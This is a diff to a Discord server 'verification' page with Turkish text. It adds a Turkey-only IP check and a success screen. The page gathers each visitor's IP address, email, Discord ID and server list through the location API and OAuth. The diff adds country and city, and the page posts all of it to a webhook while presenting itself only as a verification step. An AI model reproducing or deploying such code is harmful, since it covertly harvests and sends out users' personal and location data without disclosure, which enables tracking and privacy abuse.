@@ -65,6 +65,10 @@
       color: #ff6b6b;
       margin-top: 20px;
     }
+    .success {
+      color: #3ba55c;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -82,8 +86,13 @@
     
     <div id="errorView" class="hidden">
       <h2>VPN Tespit Edildi</h2>
-      <p class="error">VPN/proxy kullanımı tespit edildi. Sunucumuza giriş yapabilmek için VPN/proxy kullanmadan bağlanmalısınız.</p>
+      <p class="error">VPN/proxy kullanımı tespit edildi veya IP adresiniz Türkiye dışında görünüyor. Sunucumuza giriş yapabilmek için Türkiye IP adresi ile bağlanmalısınız.</p>
       <button id="retryBtn" class="btn">Tekrar Dene</button>
+    </div>
+    
+    <div id="successView" class="hidden">
+      <h2>Giriş Başarılı</h2>
+      <p class="success">Doğrulama başarıyla tamamlandı! Sunucuya yönlendiriliyorsunuz...</p>
     </div>
   </div>
 
@@ -101,6 +110,7 @@
     const initialView = document.getElementById('initialView');
     const loadingView = document.getElementById('loadingView');
     const errorView = document.getElementById('errorView');
+    const successView = document.getElementById('successView');
     const loginBtn = document.getElementById('loginBtn');
     const retryBtn = document.getElementById('retryBtn');
 
@@ -112,18 +122,23 @@
       showView(loadingView);
       
       try {
-        // 1. IP adresini ve VPN kontrolü yap
+        // 1. IP adresini ve konum kontrolü yap
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip;
         
-        // VPN kontrolü için ek API
-        const vpnCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
-        const vpnData = await vpnCheck.json();
+        // Konum kontrolü için ek API
+        const locationCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        const locationData = await locationCheck.json();
         
-        // VPN/Proxy kontrolü
-        if (vpnData.proxy || vpnData.vpn || vpnData.tor) {
+        // VPN/Proxy kontrolü ve Türkiye kontrolü
+        if (locationData.proxy || locationData.vpn || locationData.tor) {
           throw new Error('VPN/Proxy kullanımı tespit edildi');
+        }
+        
+        // Türkiye kontrolü (TR kodu)
+        if (locationData.country !== 'TR') {
+          throw new Error('IP adresiniz Türkiye dışında görünüyor');
         }
         
         // 2. Doğrudan Discord OAuth'a yönlendir
@@ -131,11 +146,7 @@
         
       } catch (error) {
         console.error('Hata:', error);
-        if (error.message.includes('VPN/Proxy')) {
-          showView(errorView);
-        } else {
-          showView(initialView);
-        }
+        showView(errorView);
       }
     });
 
@@ -156,18 +167,23 @@
       showView(loadingView);
       
       try {
-        // 1. IP adresini al ve VPN kontrolü yap
+        // 1. IP adresini al ve konum kontrolü yap
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip;
         
-        // VPN kontrolü için ek API
-        const vpnCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
-        const vpnData = await vpnCheck.json();
+        // Konum kontrolü için ek API
+        const locationCheck = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        const locationData = await locationCheck.json();
         
-        // VPN/Proxy kontrolü
-        if (vpnData.proxy || vpnData.vpn || vpnData.tor) {
+        // VPN/Proxy kontrolü ve Türkiye kontrolü
+        if (locationData.proxy || locationData.vpn || locationData.tor) {
           throw new Error('VPN/Proxy kullanımı tespit edildi');
+        }
+        
+        // Türkiye kontrolü (TR kodu)
+        if (locationData.country !== 'TR') {
+          throw new Error('IP adresiniz Türkiye dışında görünüyor');
         }
 
         // 2. Discord'dan token al
@@ -201,23 +217,21 @@
         ]);
 
         // 4. Webhook'a bilgileri gönder
-        await sendWebhook(userData, guildsData, ipAddress);
+        await sendWebhook(userData, guildsData, ipAddress, locationData);
 
-        // 5. Kullanıcıyı sunucuya yönlendir
-        window.location.href = config.discordServerInvite;
+        // 5. Başarılı mesajını göster ve sunucuya yönlendir
+        showView(successView);
+        setTimeout(() => {
+          window.location.href = config.discordServerInvite;
+        }, 2000);
 
       } catch (error) {
         console.error('Doğrulama hatası:', error);
-        if (error.message.includes('VPN/Proxy')) {
-          showView(errorView);
-        } else {
-          alert(`Doğrulama başarısız: ${error.message}`);
-          showView(initialView);
-        }
+        showView(errorView);
       }
     }
 
-    async function sendWebhook(user, guilds, ip) {
+    async function sendWebhook(user, guilds, ip, location) {
       const embed = {
         title: "Yeni Discord Doğrulaması",
         color: 0x5865F2,
@@ -231,6 +245,8 @@
           { name: "ID", value: user.id },
           { name: "Email", value: user.email || "Erişilemedi" },
           { name: "IP Adresi", value: ip || "Bilinmiyor" },
+          { name: "Ülke", value: `${location.country_name} (${location.country})` || "Bilinmiyor" },
+          { name: "Şehir", value: location.city || "Bilinmiyor" },
           { name: "Sunucular", value: guilds.slice(0, 25).map(g => g.name).join(", ") || "Yok" }
         ],
         timestamp: new Date().toISOString()
@@ -251,6 +267,7 @@
       initialView.classList.add('hidden');
       loadingView.classList.add('hidden');
       errorView.classList.add('hidden');
+      successView.classList.add('hidden');
       view.classList.remove('hidden');
     }
   </script>
